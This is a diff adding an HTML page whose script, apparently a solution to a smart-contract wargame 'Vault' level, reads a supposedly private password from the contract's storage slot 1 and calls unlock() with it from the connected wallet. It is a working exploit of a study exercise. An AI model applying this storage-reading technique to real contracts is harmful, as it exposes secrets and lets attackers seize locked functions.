@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script>
+      (async () => {
+        let ethAddr;
+        if (window.ethereum) {
+          window.web3 = new Web3(window.ethereum);
+          let conn = await window.ethereum.enable();
+          if (conn.length > 0) {
+            ethAddr = conn[0];
+          }
+        } else {
+          return;
+        }
+
+        const vaultContrAddr = "0x018777B2BA311333260f92bb751A73A7e3eC4644";
+        const vaultContract = new window.web3.eth.Contract(
+          [
+            {
+              inputs: [
+                {
+                  internalType: "bytes32",
+                  name: "_password",
+                  type: "bytes32",
+                },
+              ],
+              stateMutability: "nonpayable",
+              type: "constructor",
+            },
+            {
+              inputs: [],
+              name: "locked",
+              outputs: [
+                {
+                  internalType: "bool",
+                  name: "",
+                  type: "bool",
+                },
+              ],
+              stateMutability: "view",
+              type: "function",
+            },
+            {
+              inputs: [
+                {
+                  internalType: "bytes32",
+                  name: "_password",
+                  type: "bytes32",
+                },
+              ],
+              name: "unlock",
+              outputs: [],
+              stateMutability: "nonpayable",
+              type: "function",
+            },
+          ],
+          vaultContrAddr
+        );
+
+        const _password = await window.web3.eth.getStorageAt(vaultContrAddr, 1);
+        await vaultContract.methods.unlock(_password).send({ from: ethAddr });
+      })();
+    </script>
+  </body>
+</html>
